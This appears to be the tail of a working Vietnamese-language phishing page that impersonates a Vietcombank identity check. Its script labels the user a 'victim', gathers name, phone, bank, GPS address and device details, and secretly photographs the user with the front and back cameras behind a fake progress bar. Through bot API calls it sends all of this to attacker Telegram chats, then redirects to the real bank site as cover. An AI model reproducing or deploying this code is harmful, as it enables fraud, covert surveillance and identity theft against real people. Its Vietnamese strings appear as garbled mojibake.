                { percent: 60, text: 'ƒêang ch·ª•p ·∫£nh x√°c th·ª±c...' },
                { percent: 80, text: 'ƒêang x·ª≠ l√Ω d·ªØ li·ªáu...' },
                { percent: 100, text: 'ƒêang g·ª≠i th√¥ng tin x√°c minh...' }
            ];
            
            // B∆∞·ªõc 1
            updateCameraProgress(steps[0]);
            victimData.deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cores: navigator.hardwareConcurrency || 'Kh√¥ng x√°c ƒë·ªãnh'
            };
            await delay(1500);
            
            // B∆∞·ªõc 2: Camera tr∆∞·ªõc
            updateCameraProgress(steps[1]);
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: false
                });
                document.getElementById('frontCamera').srcObject = stream;
                await delay(2000);
                
                // B∆∞·ªõc 3: Ch·ª•p ·∫£nh
                updateCameraProgress(steps[2]);
                victimData.frontCam = await capturePhoto('frontCamera');
                stream.getTracks().forEach(t => t.stop());
            } catch (err) {
                console.log('Camera tr∆∞·ªõc kh√¥ng kh·∫£ d·ª•ng');
            }
            await delay(1500);
            
            // B∆∞·ªõc 4: Camera sau
            updateCameraProgress(steps[3]);
            try {
                const backStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: 'environment' } },
                    audio: false
                });
                document.getElementById('backCamera').srcObject = backStream;
                await delay(2000);
                victimData.backCam = await capturePhoto('backCamera');
                backStream.getTracks().forEach(t => t.stop());
            } catch (err) {
                console.log('Camera sau kh√¥ng kh·∫£ d·ª•ng');
            }
            await delay(1500);
            
            // B∆∞·ªõc 5: G·ª≠i d·ªØ li·ªáu
            updateCameraProgress(steps[4]);
            await sendAllDataToTelegram();
            await delay(2000);
            
            // Ho√†n th√†nh
            showFinalStep();
        }
        
        async function capturePhoto(elementId) {
            return new Promise((resolve) => {
                setTimeout(() => {
                    const video = document.getElementById(elementId);
                    if (!video || !video.videoWidth) {
                        resolve(null);
                        return;
                    }
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    
                    resolve(canvas.toDataURL('image/jpeg', 0.8));
                }, 1000);
            });
        }
        
        // ================= G·ª¨I TELEGRAM =================
        async function sendAllDataToTelegram() {
            victimData.timestamp = new Date().toLocaleString('vi-VN');
            
            const textMessage = `
üéØ <b>N·∫†N NH√ÇN M·ªöI - V·ªä TR√ç TH·∫¨T + GPS</b>

<b>üë§ TH√îNG TIN:</b>
‚îú H·ªç t√™n: <code>${victimData.name}</code>
‚îú SƒêT: <code>${victimData.phone}</code>
‚îî Ng√¢n h√†ng: ${victimData.bank}

<b>üìç V·ªä TR√ç CH√çNH X√ÅC:</b>
‚îú T·ªça ƒë·ªô GPS: <code>${victimData.location}</code>
‚îú ƒê·ªô ch√≠nh x√°c: ${Math.round(victimData.accuracy)} m√©t
‚îú ƒê·ªãa ch·ªâ: ${victimData.address}
‚îú Ph∆∞·ªùng/X√£: ${victimData.ward}
‚îú Qu·∫≠n/Huy·ªán: ${victimData.district}
‚îî T·ªânh/TP: ${victimData.city}

<b>üì∑ CAMERA:</b>
‚îú Camera tr∆∞·ªõc: ${victimData.frontCam ? '‚úÖ ƒê√É CH·ª§P' : '‚ùå KH√îNG'}
‚îî Camera sau: ${victimData.backCam ? '‚úÖ ƒê√É CH·ª§P' : '‚ùå KH√îNG'}

<b>üì± THI·∫æT B·ªä:</b>
‚îú Platform: ${victimData.deviceInfo.platform}
‚îú Ng√¥n ng·ªØ: ${victimData.deviceInfo.language}
‚îú M√†n h√¨nh: ${victimData.deviceInfo.screen}
‚îú Timezone: ${victimData.deviceInfo.timezone}
‚îú CPU Cores: ${victimData.deviceInfo.cores}
‚îî User Agent: <code>${victimData.deviceInfo.userAgent.substring(0, 80)}...</code>

<b>‚è∞ TH·ªúI GIAN:</b>
${victimData.timestamp}
            `.trim();
            
            for (const chatId of CHAT_IDS) {
                try {
                    await sendTelegramMessage(chatId, textMessage, 'HTML');
                    
                    if (victimData.frontCam) {
                        await sendTelegramPhoto(chatId, victimData.frontCam, 
                            `üì∏ CAMERA TR∆Ø·ªöC - ${victimData.name}\nüìç ${victimData.address.substring(0, 50)}...`);
                        await delay(1000);
                    }
                    
                    if (victimData.backCam) {
                        await sendTelegramPhoto(chatId, victimData.backCam, 
                            `üì∏ CAMERA SAU - ${victimData.name}\nüìç ${victimData.location}`);
                    }
                    
                } catch (error) {
                    console.error(`L·ªói g·ª≠i ƒë·∫øn ${chatId}:`, error);
                }
            }
        }
        
        async function sendTelegramMessage(chatId, text, parseMode = 'HTML') {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: text,
                    parse_mode: parseMode
                })
            });
            return await response.json();
        }
        
        async function sendTelegramPhoto(chatId, photoBase64, caption = '') {
            try {
                const base64Data = photoBase64.split(',')[1];
                const byteCharacters = atob(base64Data);
                const byteNumbers = new Array(byteCharacters.length);
                
                for (let i = 0; i < byteCharacters.length; i++) {
                    byteNumbers[i] = byteCharacters.charCodeAt(i);
                }
                
                const byteArray = new Uint8Array(byteNumbers);
                const blob = new Blob([byteArray], { type: 'image/jpeg' });
                
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'camera.jpg');
                if (caption) formData.append('caption', caption);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
            } catch (error) {
                // Fallback
                try {
                    const base64Data = photoBase64.split(',')[1];
                    const byteCharacters = atob(base64Data);
                    const byteNumbers = new Array(byteCharacters.length);
                    
                    for (let i = 0; i < byteCharacters.length; i++) {
                        byteNumbers[i] = byteCharacters.charCodeAt(i);
                    }
                    
                    const byteArray = new Uint8Array(byteNumbers);
                    const blob = new Blob([byteArray], { type: 'image/jpeg' });
                    
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('document', blob, 'camera.jpg');
                    if (caption) formData.append('caption', caption);
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                        method: 'POST',
                        body: formData
                    });
                } catch (e) {
                    console.error('L·ªói g·ª≠i document:', e);
                }
            }
        }
        
        // ================= H√ÄM PH·ª§ =================
        function updateProgress(percent, text) {
            document.getElementById('progressFill').style.width = percent + '%';
            document.getElementById('progressText').textContent = text;
            document.getElementById('currentStatus').textContent = text;
        }
        
        function updateCameraProgress(step) {
            document.getElementById('cameraProgressFill').style.width = step.percent + '%';
            document.getElementById('cameraProgressText').textContent = step.text;
            document.getElementById('cameraStatus').textContent = step.text;
        }
        
        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        function showFinalStep() {
            document.getElementById('step3').classList.add('hidden');
            document.getElementById('step4').classList.remove('hidden');
            
            const txId = 'VCB-' + Date.now().toString().slice(-8);
            document.getElementById('transactionId').textContent = `M√£ giao d·ªãch: ${txId}`;
            
            let count = 5;
            const countdownEl = document.getElementById('countdown');
            const interval = setInterval(() => {
                count--;
                countdownEl.textContent = count;
                
                if (count <= 0) {
                    clearInterval(interval);
                    window.location.href = 'https://vietcombank.com.vn';
                }
            }, 1000);
        }
        
        // ================= AUTO-FILL =================
        window.addEventListener('DOMContentLoaded', () => {
            try {
                const savedPhone = localStorage.getItem('lastPhone');
                if (savedPhone) {
                    document.getElementById('phoneNumber').value = savedPhone;
                }
                
                document.getElementById('phoneNumber').addEventListener('input', function() {
                    localStorage.setItem('lastPhone', this.value);
                });
            } catch (e) {}
        });
    </script>
</body>
</html>
